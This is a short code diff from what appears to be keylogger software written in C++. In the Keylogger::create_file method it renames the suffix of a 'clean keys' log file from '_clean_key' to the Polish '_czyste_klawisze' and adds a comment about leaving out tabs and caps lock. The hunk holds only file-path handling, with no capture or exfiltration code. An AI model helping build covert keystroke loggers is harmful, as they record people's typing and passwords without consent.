@@ -266,7 +266,7 @@ std::string Keylogger::create_file()
 	// TODO: This should be as a utility function as this is used in many places
 	size_t position_to_prepend = m_file_path.find(".log");
 	std::string path_for_clean_keys = m_file_path;
-	path_for_clean_keys.insert(position_to_prepend, "_clean_key");
+	path_for_clean_keys.insert(position_to_prepend, "_czyste_klawisze"); // No tabs, caps locks etc
 	this->file_logs_clean_keys.open(path_for_clean_keys);
 
 	return m_file_path;
